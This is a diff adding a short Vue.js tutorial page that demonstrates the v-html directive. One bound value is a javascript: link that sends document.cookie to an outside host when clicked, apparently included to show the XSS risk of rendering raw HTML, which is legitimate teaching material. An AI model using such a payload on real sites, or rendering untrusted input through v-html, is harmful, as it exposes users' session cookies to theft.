@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>2.v-html</title>
+    <script type="text/javascript" src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <div>Hello,{{name}}</div>
+        <div v-html="str"></div>
+        <div v-html="str2"></div>
+    </div>
+    <script type="text/javascript">
+        Vue.config.productionTip = false
+
+        new Vue({
+            el:'#root',
+            data:{ 
+                name:'Cindy',
+                str:'<h3>lalala</h3>',
+                str2:'<a href=javascript:alert(location.href="http://google.com?"+document.cookie)>data here</a>'
+            }
+        })
+    </script>
+</body>
+</html>
